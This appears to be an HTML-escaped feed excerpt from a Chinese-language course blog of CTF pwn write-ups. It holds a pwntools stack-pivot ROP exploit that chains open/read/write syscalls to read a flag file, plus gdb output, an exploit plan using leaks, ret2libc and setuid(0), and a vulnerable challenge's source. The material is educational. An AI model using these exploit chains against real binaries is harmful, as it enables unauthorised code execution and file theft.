&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ x/10i 0x448280
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x448280 &amp;lt;read+16&amp;gt;: syscall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">=&lt;/span>&amp;gt; 0x448282 &amp;lt;read+18&amp;gt;: cmp rax,0xfffffffffffff000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x448288 &amp;lt;read+24&amp;gt;: ja 0x4482e0 &amp;lt;read+112&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x44828a &amp;lt;read+26&amp;gt;: ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>會這樣的原因是我們在ROPgadget中找不到&lt;code>syscall ; ret&lt;/code>的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop&lt;/li>
&lt;li>Construct ROP
首先，我們的流程是
==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write==
會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload
&lt;ol>
&lt;li>寫入的bss_addr和main_fn address
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>bss_addr_open &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2700&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr_read &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2800&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr_write &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2900&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>main_fn &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401ce1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>trash_payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">0x20&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(trash_payload &lt;span style="color:#f92672">+&lt;/span> p64(bss_addr_open) &lt;span style="color:#f92672">+&lt;/span> p64(main_fn))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到&lt;code>0x4c2700&lt;/code>，然後ret address接main_fn
用gdb跟一下，放完的結果大概是這樣
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>0x00007ffc884f3670│+0x0000: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#34;&lt;/span> ← $rsp, $rsi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3678│+0x0008: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaaaaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3680│+0x0010: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3688│+0x0018: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3690│+0x0020: 0x00000000004c2700 → &amp;lt;transmem_list+0&amp;gt; add BYTE PTR &lt;span style="color:#f92672">[&lt;/span>rax&lt;span style="color:#f92672">]&lt;/span>, al ← $rbp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3698│+0x0028: 0x0000000000401ce1 → &amp;lt;main+12&amp;gt; lea rax, &lt;span style="color:#f92672">[&lt;/span>rbp-0x20&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>當main_fn執行完leave(&lt;code>mov rsp , rbp ; pop rbp ;&lt;/code>)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700&lt;/li>
&lt;li>觀察main_fn的assembly
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ x/10i &amp;amp;main
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cd5 &amp;lt;main&amp;gt;: endbr64
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cd9 &amp;lt;main+4&amp;gt;: push rbp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cda &amp;lt;main+5&amp;gt;: mov rbp,rsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cdd &amp;lt;main+8&amp;gt;: sub rsp,0x20
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ce1 &amp;lt;main+12&amp;gt;: lea rax,&lt;span style="color:#f92672">[&lt;/span>rbp-0x20&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ce5 &amp;lt;main+16&amp;gt;: mov edx,0x80
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cea &amp;lt;main+21&amp;gt;: mov rsi,rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ced &amp;lt;main+24&amp;gt;: mov edi,0x0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cf2 &amp;lt;main+29&amp;gt;: call 0x448270 &amp;lt;read&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cf7 &amp;lt;main+34&amp;gt;: mov eax,0x0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來&lt;/li>
&lt;li>寫入bss_addr_open
我們的目標是達成==fd = open(&amp;quot;/home/chal/flag.txt&amp;quot;, 0);==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>file_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/home/chal/flag.txt&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">0x20&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ROP_open &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Open file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fd = open(&amp;#34;/home/chal/flag.txt&amp;#34;, 0);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">2&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr_open &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main_fn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_open)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方&lt;/li>
&lt;li>寫入bss_addr_read
我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>ROP_read &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Read the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># read(fd, buf, 0x30);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_write,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, &lt;span style="color:#ae81ff">3&lt;/span>, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0x30&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main_fn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_read)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>寫入bss_addr_write
我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>ROP_write &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Write the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># write(1, buf, 0x30);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_write,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0x30&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_write)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>:::danger
執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行&lt;/p></description></item><item><title>Simple PWN 0x36(2023 HW - Notepad-Stage 3)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/</guid><description>&lt;h1 id="simple-pwn-0x362023-hw---notepad-stage-3">
 Simple PWN 0x36(2023 HW - Notepad-Stage 3)
 &lt;a class="anchor" href="#simple-pwn-0x362023-hw---notepad-stage-3">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題沒時間解出來，所以僅僅做個紀錄，包含和各位大老討論的結果以及流程&lt;/p>
&lt;ol>
&lt;li>首先，後端有一個洞，就是在login的write，他的buf仔細和其他有call到write做對比會發現，他並沒有清掉buf的內容，這代表他會完完整整的把裡面的內容送到前端，但為甚麼前面兩題都沒有這個問題呢?因為前端並沒有把buf的內容印出來，所以首要目標是找到一個方法可以leak出內容的shellcode之類的，這樣我們就可以抓到text / libc base address&lt;/li>
&lt;li>知道這些事情可以幹嘛呢?check token有一個bof的洞，我們可以利用這個洞來傳送rop，所以需要ret2libc抓到base address之後在蓋rop&lt;/li>
&lt;li>ROP具體的內容是甚麼呢?有兩種方法可以拿到flag，一個是拿到shell之後setuid(0)，因為backend 有 suid 權限，所以我們才可以用 setuid(0) 以root 執行，然後cat /flag_root；第二種是直接ORW，看flag是啥這樣&lt;/li>
&lt;/ol></description></item><item><title>Simple PWN 0x37(2023 HW - HACHAMA)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/</guid><description>&lt;h1 id="simple-pwn-0x372023-hw---hachama">
 Simple PWN 0x37(2023 HW - HACHAMA)
 &lt;a class="anchor" href="#simple-pwn-0x372023-hw---hachama">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>stack pivot
rop
bof&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;SECCOMP.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> n;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> msg[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> n2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_filter&lt;/span> seccompfilter[]&lt;span style="color:#f92672">=&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_LD &lt;span style="color:#f92672">|&lt;/span> BPF_W &lt;span style="color:#f92672">|&lt;/span> BPF_ABS, ArchField),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_JUMP(BPF_JMP &lt;span style="color:#f92672">|&lt;/span> BPF_JEQ &lt;span style="color:#f92672">|&lt;/span> BPF_K, AUDIT_ARCH_X86_64, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_RET &lt;span style="color:#f92672">|&lt;/span> BPF_K, SECCOMP_RET_KILL),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_LD &lt;span style="color:#f92672">|&lt;/span> BPF_W &lt;span style="color:#f92672">|&lt;/span> BPF_ABS, SyscallNum),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(open),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(openat),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(read),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(write),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(close),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(readlink),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(getdents),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(getrandom),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(brk),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(rt_sigreturn),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(exit),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(exit_group),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_RET &lt;span style="color:#f92672">|&lt;/span> BPF_K, SECCOMP_RET_KILL),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_fprog&lt;/span> filterprog&lt;span style="color:#f92672">=&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	.len&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">sizeof&lt;/span>(seccompfilter)&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_filter&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	.filter&lt;span style="color:#f92672">=&lt;/span>seccompfilter
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">apply_seccomp&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(prctl(PR_SET_NO_NEW_PRIVS,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		perror(&lt;span style="color:#e6db74">&amp;#34;Seccomp Error&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&lt;span style="color:#f92672">&amp;amp;&lt;/span>filterprog)&lt;span style="color:#f92672">==-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		perror(&lt;span style="color:#e6db74">&amp;#34;Seccomp Error&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	apply_seccomp();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf2[&lt;span style="color:#ae81ff">0x30&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">// long n2 = 0x30;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#75715e">// char msg[0x20];
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#66d9ef">char&lt;/span> name[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">// long n = 20;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	n2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x30&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Haaton&amp;#39;s name? &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	n &lt;span style="color:#f92672">=&lt;/span> read(&lt;span style="color:#ae81ff">0&lt;/span>, name, n);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	name[n] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	strcpy(msg, name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	strcat(msg, &lt;span style="color:#e6db74">&amp;#34; hachamachama&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(msg);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;ECHO HACHAMA!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		read(&lt;span style="color:#ae81ff">0&lt;/span>, buf2, n2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (strcmp(buf2, &lt;span style="color:#e6db74">&amp;#34;HACHAMA&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			write(&lt;span style="color:#ae81ff">1&lt;/span>, buf2, n2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x38(Lab - UAF)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/</guid><description>&lt;h1 id="simple-pwn-0x38lab---uaf">
 Simple PWN 0x38(Lab - UAF)
 &lt;a class="anchor" href="#simple-pwn-0x38lab---uaf">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/ByxvsvNr6.png" alt="圖片" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
